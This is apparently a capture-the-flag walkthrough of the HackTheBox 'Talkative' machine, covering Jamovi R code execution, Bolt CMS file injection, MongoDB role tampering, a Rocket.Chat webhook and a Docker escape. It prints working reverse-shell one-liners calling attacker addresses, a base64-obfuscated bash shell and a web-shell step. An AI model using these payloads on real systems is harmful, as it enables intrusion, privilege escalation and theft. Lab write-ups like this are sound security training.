# HackTheBox - Talkative

## NMAP

```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:                  
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: i3D7nWb4BARMskXKt
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding  
|     Date: Sat, 09 Apr 2022 19:09:17 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=tr
ue">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
8080/tcp open  http    Tornado httpd 5.0
|_http-title: jamovi
8081/tcp open  http    Tornado httpd 5.0
|_http-title: 404: Not Found
8082/tcp open  http    Tornado httpd 5.0
|_http-title: 404: Not Found
```

## PORT 80 (HTTP)

<img src="https://i.imgur.com/yh9I5BT.png"/>

Visiting port 80 will redirect us to `talkative.htb` so let's add this to `/etc/hosts` file

<img src="https://i.imgur.com/4PYdY3M.png"/>

<img src="https://i.imgur.com/1bAKK0p.png"/>

Scolling below we do see some names which can be helpful for us later

<img src="https://i.imgur.com/zM7JWLE.png"/>

Going at the bottom we have 2 links about the products which will be launched soon

<img src="https://i.imgur.com/JGituUi.png"/>

The first one "TALK-A-STATS" is about a  `JAMOVI` spreadsheet software running on port 8080

<img src="https://i.imgur.com/Rbvsp7u.png"/>

And the other "TALKFORBIZ" is `rocket chat` running on port 3000

I tried fuzzing for files using `dirsearch` but it was awfully slow 

<img src="https://i.imgur.com/83BaWGy.png"/>

Checking what wappalyzer showed us about what backend or technologies the website is using 

<img src="https://i.imgur.com/HfJv5oV.png"/>

It's using bolt cms, we can access the login page by visting `/bolt`, I found this end point by lookup at bolt's documentation 

https://docs.boltcms.io/5.0/manual/login

<img src="https://i.imgur.com/eplvM8q.png"/>

Right now we don't have any credentials so let's just move on


## PORT 3000 (rocket chat)

<img src="https://i.imgur.com/MOLc37e.png"/>

I tried creating an account on rocket chat

<img src="https://i.imgur.com/6Yaloy8.png"/>

It then prompted error about invalid domain

<img src="https://i.imgur.com/dwVmxPA.png"/>

So let's just used `talkative.htb`  as domain name

<img src="https://i.imgur.com/x16HJkh.png"/>

This allowed us to register an account but we don't see anything there apart from `General` channel in which there's only admin

<img src="https://i.imgur.com/9G8n21b.png"/>

So I decided to run the exploit for password reset on admin account 

https://www.exploit-db.com/exploits/50108

<img src="https://i.imgur.com/1aoJae8.png"/>

But it didn't seem that it was working as it was just printing the alphabets


## PORT 8080 (jamovi)

<img src="https://i.imgur.com/J4U38Kc.png"/>

Checking for exploits related jamovi there's one related to XSS that can be escalted to rce

<img src="https://i.imgur.com/xRkgr2h.png"/>

https://sploitus.com/exploit?id=F45F77BE-1B49-5574-A908-64EF4C774BD7&utm_source=rss&utm_medium=rss

The description of exploit says 

```
Jamovi is affected by a cross-site scripting (XSS) vulnerability. The column-name is vulnerable to XSS in the ElectronJS Framework. An attacker can make a .omv (Jamovi) document containing a payload. When opened by victim, the payload is triggered.

```

So the column name is vulnerable to XSS, let's test this if it works here

<img src="https://i.imgur.com/ysRi2xy.png"/>

Now when we refresh the page it's going to execute the alert command

<img src="https://i.imgur.com/0N2Gbnk.png"/>

But this was only XSS and we can't escalate this further to get rce in this scenario

If we see the options we have on javormi there's `Rj` editor, so we can try to execute commands using the R language

<img src="https://i.imgur.com/i9nyVcM.png"/>

So lookup the documentation for R langague we can execute system commands like this 

 https://rdrr.io/r/base/system.html 

<img src="https://i.imgur.com/vPl5d29.png"/>

```bash
system("bash -c 'id'", intern = TRUE)
```

<img src="https://i.imgur.com/pNLzGrH.png"/>

We get the output of the `id` command as a root user but we are not actually the root user on the target machine, if we check the `hostname` this will return as a random value which indicates that we are inside a docker container

<img src="https://i.imgur.com/5a9bUnL.png"/>

To get a reverse shel I used bash reverse encoded in base64 

```bash
system("bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni8yMjIyIDA+JjEK | base64 -d |bash'",intern = TRUE)
```

<img src="https://i.imgur.com/ZQWwVaU.png"/>

After getting a shell we can stabilize it so we can get the functionality of using arrow keys and tab auto complete

<img src="https://i.imgur.com/AisgfBl.png"/>

In root's folder we can see a `omv` file named `bolt-administration`

<img src="https://i.imgur.com/D5xbJUb.png"/>

Now the issue here was there was no netcat,net-tools,curl or wget that I could transfere this omv file on to my machine neither there was any tool to unzip the omv file so I base64 encoded the contents of the file

<img src="https://i.imgur.com/fJ3m6VV.png"/>

Copied it on my host machine's terminal and saved it then piped it to base64 decode and got the file

<img src="https://i.imgur.com/dAVJAtv.png"/>

<img src="https://i.imgur.com/gvTfaOF.png"/>

Reading the `xdata.json` we can see usernames and passwords for bolt

<img src="https://i.imgur.com/OZ9A4cV.png"/>

<img src="https://i.imgur.com/wQzote6.png"/>

I tried the credentials for `janit` , it failed

<img src="https://i.imgur.com/25gs4Gx.png"/>

Tried `sual`'s credentials which gave an error on authenticating

<img src="https://i.imgur.com/oWhybfJ.png"/>

Same with `matt`, so I decided to test `admin` as the username with the passwords  and `jeO09ufhWD<s` worked for the admin user

<img src="https://i.imgur.com/Ig3Zp3v.png"/>

We can also see the bolt version which is `Bolt v 5.1.3`

<img src="https://i.imgur.com/9zAu9kP.png"/>

Having access to admin dashboard we can an option to upload files but problem is that it has a whitelist that is allowing specfic file extensions 

<img src="https://i.imgur.com/cnXYdUd.png"/>

Visting `All Configuration Files` from `Configuration` we'll see a file named `bundles.php`

<img src="https://i.imgur.com/CmvNv9k.png"/>

<img src="https://i.imgur.com/wt7J7p5.png"/>

Adding a php command in that file will lead too execute that on a 404 request 

<img src="https://i.imgur.com/iDf8Ldi.png"/>

<img src="https://i.imgur.com/8ZcMv4S.png"/>

I tried getting the reverse shell the same way as I did with javormi container but the connection kept closing

```bash
system("bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni8yMjIyIDA+JjEK | base64 -d |bash'")
```

<img src="https://i.imgur.com/Ir3quTG.png"/>

Instead I just copied php bash a web interactive shell  in bundles.php

https://github.com/Arrexel/phpbash/blob/master/phpbash.php

<img src="https://i.imgur.com/O1Dedpq.png"/>

<img src="https://i.imgur.com/PtmsJFN.png"/>

So looks like we are in another container and this would be for bolt cms, we can get a reverse shell from here

<img src="https://i.imgur.com/Rf3tIAn.png"/>

<img src="https://i.imgur.com/Zaah4Y4.png"/>

The reason I used `rlwrap` before `nc` is because there's no python or python3 on container which would allow us to stabilize the shell to get autocomplete and naviagting around bash history so rlwrap kinda gives us that functionaility

On the conatiner we can also see that there's `curl` so we can download `nmap` and run a scan to see if there are any other containers in the network

<img src="https://i.imgur.com/RKhkwuO.png"/>

<img src="https://i.imgur.com/B7JnX71.png"/>

But I wasn't able to run the nmap on the container as it first checked if service scripts were in the path and if not it would revert to `/etc/services` which wasn't on the container as well

<img src="https://i.imgur.com/m3qX3sG.png"/>

I thought of using ssh on the target machine (talkative.htb) as the docker gateways is the host machine but it was giving an error because we didn't have a tty shell

<img src="https://i.imgur.com/KbJ0bq9.png"/>

This can be resolved by using `script` to spawn bash shell

<img src="https://i.imgur.com/mEGWw5b.png"/>

And with the password `jeO09ufhWD<s` we can login in saul on the host machine 

<img src="https://i.imgur.com/lEPhAh2.png"/>

We can try to get a stabilize shell by first getting a reverse shell and stabilizing it with python3

<img src="https://i.imgur.com/M5hexGT.png"/>

<img src="https://i.imgur.com/gYJ1RCS.png"/>

After I transferred `pspy` to monitor the background processes running 

<img src="https://i.imgur.com/Bh8MI1t.png"/>

<img src="https://i.imgur.com/vL61ESa.png"/>

`update_mongo.py` seemed interesting but we didn't had permissions to read it so checking to see if there's any local port listening 


<img src="https://i.imgur.com/NH9NPeO.png"/>

This gave us a lot of open ports but out all of open ports, port 3000 seemes interesting as this is what we encountered earlier and it semes that it's hosted from this machine 

Checking the apache config files to see where rocket chat's directory is 

<img src="https://i.imgur.com/7VpfUz2.png"/>

It didn't showed us the path but we know that `admin@talkative.htb` is a valid username on that site, running `arp -a` will reveal how many containers the host is using 

<img src="https://i.imgur.com/kfhOU42.png"/>

Using the static binary of nmap we transferred

<img src="https://i.imgur.com/zsNmUDW.png"/>

Googling this port tells that this is for `mongodb`  and rocket chat uses mongdb for it's backend

<img src="https://i.imgur.com/gnrge3j.png"/>

So we need to do port forwarding for `27017` that is open on `172.17.0.2` conatiner and we can do that by using `chisel`

https://github.com/jpillora/chisel/releases/tag/v1.7.7

Transferring this binary on the target machine 

<img src="https://i.imgur.com/iFySp5l.png"/>

After transferring on the target machine we'll use chisel as a server on port 9000 using reverse proxy for port forwarding and on the target machine we'll use chisel client to conenct to port 9000 from our local machine and forwarding port 27017 from the container 172.17.0.2 

This article does a great job in explaning this process

https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683

<img src="https://i.imgur.com/6petumT.png"/>

To interact with mongodb we need to use `mongosh`, it isn't installed by default so downloading mongo db and it's dependencies

https://www.dailytask.co/task/install-mongo-shell-in-ubuntu-ahmed-zidan


Using this command we'll be able to connect to mongodb

```bash
mongosh "mongodb://localhost:27017"
```

<img src="https://i.imgur.com/kzjzHG0.png"/>

Getting connected to mongo backend we can run commands to enumerate databases, I wasn't familar with using mongosh so this article helped me in enumerating the databaes and tables

https://dzone.com/articles/mongodb-commands-cheat-sheet-for-beginners

<img src="https://i.imgur.com/Il9EaHO.png"/>

We can see the size of `meteor` is around 5 MB so it must be having some data, switching to meteor database  with `use meteor`

<img src="https://i.imgur.com/0y9pVPY.png"/>

<img src="https://i.imgur.com/pjm35IF.png"/>

Listing the values in `users` with `db.user.find()`

<img src="https://i.imgur.com/n6SEscG.png"/>

At first I tried changing the password to `12345` and converting into bcrypt hash and then updating the admin user's password 

https://docs.rocket.chat/guides/administration/misc.-admin-guides/restoring-an-admin

```bash
db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$ZcP2SxsOH811cJjuxgvk.udV8pkPx7Hw6G9GqKr08S3ZcYFnNRz7C" } } } })

```

But this wasn't working as when I visited the rocket chat site it was still giving an error on login so instead I created a user and gave him the admin role

```bash
db.users.update({username: "arz"}, { $push: { roles: "admin"}})
```

<img src="https://i.imgur.com/ebYuUZt.png"/>

<img src="https://i.imgur.com/7qedEkl.png"/>

<img src="https://i.imgur.com/0MxNLdT.png"/>

The reason why I port forwarded 3000 is because it wasn't repsonding normally with 
`talkative.htb:3000` so I port forwarded like I did for mongodb

<img src="https://i.imgur.com/GobLDUt.png"/>

We can get remote execution by using node js and calling a bash reverse shell, there's a blog explaining abusing intergration to get remote code execution

<img src="https://i.imgur.com/wSrd8KS.png"/>

https://blog.sonarsource.com/nosql-injections-in-rocket-chat

Access the administration panel and visit Integrations and then select `Incoming WebHook`

<img src="https://i.imgur.com/hJ0YDdN.png"/>

<img src="https://i.imgur.com/tX1plIh.png"/>

<img src="https://i.imgur.com/8mBSEz9.png"/>

```bash
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.73/6666 0>&1'");
```
<img src="https://i.imgur.com/XWVaMrt.png"/>

After saving changes, you'll get a url for webhook

<img src="https://i.imgur.com/ZMJPVVI.png"/>

Visit this link and you'll get a shell

<img src="https://i.imgur.com/8TnUx53.png"/>

After getting a shell we are again inside a container, there wasn't anything interesting on this container , so I decide to check what capabilites we have on this docker instance

<img src="https://i.imgur.com/NvIKeRp.png"/>

So no `capsh` binary but there's another way to view capabilites by reading `/proc/self/status` and using capsh from our local machine

https://blog.nody.cc/posts/container-breakouts-part2/

<img src="https://i.imgur.com/7wX7iKu.png"/>

<img src="https://i.imgur.com/5F7C8Sv.png"/>

Copying the value `CapBnd`  which is `00000000a80425fd`

<img src="https://i.imgur.com/yAOkyYx.png"/>

Here we can see a capability `cap_dac_read_search` which allows us to read the files from the host machine 

<img src="https://i.imgur.com/rwwrc2O.png"/>

https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3

There was an exploit written in c language which was linked in the article, I downloaded the source code and compiled on my local machine 

http://stealth.openwall.net/xSports/shocker.c

<img src="https://i.imgur.com/ubhIli9.png"/>

Since there was no wget or curl through which we can download binary , I used the `cat` to download the binary from our machine by hosting it through `nc` 

```bash
cat < /dev/tcp/10.10.14.139/1111 > test
```

```bash
nc -lnvp 1111 < test
```

<img src="https://i.imgur.com/LGb0DQo.png"/>

<img src="https://i.imgur.com/Z5kCEiE.png"/>

But this exploit failed to ran, so went on searching other exploits and found a github repo for `cdk`

<img src="https://i.imgur.com/M9bRuXn.png"/>

<img src="https://i.imgur.com/q5flLdL.png"/>

https://github.com/cdk-team/CDK

Downloaded the binary on my local machine and transferred it the same way 

<img src="https://i.imgur.com/Hvg5Ntp.png"/>

Tried running this binary to read `/etc/hosts` from the host machine but still it failed

<img src="https://i.imgur.com/Rf7dNKs.png"/>

Nex tried this command 

```bash
./cdk run cap-dac-read-search /etc/hosts /
```

<img src="https://i.imgur.com/BG26gWy.png"/>

This worked as it was able to chdir to host root `/` as spawning bash, to get a shell on the host machine as root user we can put our public key in `/root/.ssh/authorized_keys`

<img src="https://i.imgur.com/931ebG1.png"/>

Going back to the host machine as saul user and downloading the ssh private key

<img src="https://i.imgur.com/LKstc0i.png"/>

<img src="https://i.imgur.com/sACHIbM.png"/>

## References
- https://www.exploit-db.com/exploits/50108
- https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md
- https://sploitus.com/exploit?id=F45F77BE-1B49-5574-A908-64EF4C774BD7&utm_source=rss&utm_medium=rss
- https://rdrr.io/r/base/system.html 
- https://docs.boltcms.io/5.0/manual/login
- https://github.com/Arrexel/phpbash/blob/master/phpbash.php
- https://github.com/jpillora/chisel/releases/tag/v1.7.7
- https://medium.com/geekculture/chisel-network-tunneling-on-steroids-a28e6273c683
- https://dzone.com/articles/mongodb-commands-cheat-sheet-for-beginners
- https://stackoverflow.com/questions/24985684/mongodb-show-all-contents-from-all-collections
- https://docs.rocket.chat/guides/administration/misc.-admin-guides/restoring-an-admin
- https://blog.sonarsource.com/nosql-injections-in-rocket-chat
- https://blog.nody.cc/posts/container-breakouts-part2/
- https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3
- http://stealth.openwall.net/xSports/shocker.c
- https://github.com/cdk-team/CDK

